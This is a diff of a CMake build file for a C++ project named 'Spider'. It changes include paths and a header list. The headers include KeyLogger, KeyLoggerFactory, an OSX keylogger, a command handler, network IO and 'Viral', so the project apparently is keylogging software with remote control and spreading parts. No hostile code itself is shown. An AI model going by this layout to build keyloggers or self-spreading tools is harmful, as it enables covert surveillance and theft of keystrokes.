@@ -20,11 +20,10 @@ enable_testing()
 include(CTest)
 
 include_directories(Project)
-include_directories(Project/Protocol)
 include_directories(vendor/core/Project/core-utils/project)
 include_directories(vendor/core/Project/core-network/project)
 
-set(HEADERS_SPIDER Project/CSpiderCore.hpp Project/Configuration.hpp Project/Connection.hpp Project/KeyLogger.hpp Project/KeyLoggerFactory.hpp Project/LogHandle.hpp Project/LazySingleton.hpp Project/Protocol/MessagesEnums.hpp Project/Protocol/Protocol.hpp)
+set(HEADERS_SPIDER Project/CSpiderCore.hpp Project/Configuration.hpp Project/Connection.hpp Project/KeyLogger.hpp Project/KeyLoggerFactory.hpp Project/LogHandle.hpp Project/LazySingleton.hpp Project/Protocol/CommandHandler.hpp Project/Protocol/MessagesEnums.hpp Project/Protocol/Messages.hpp Project/Network/IOManager.hpp Project/Viral.hpp)
 if (APPLE)
     set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/details/OSXKeyLogger.hpp)
 elseif(WIN32)
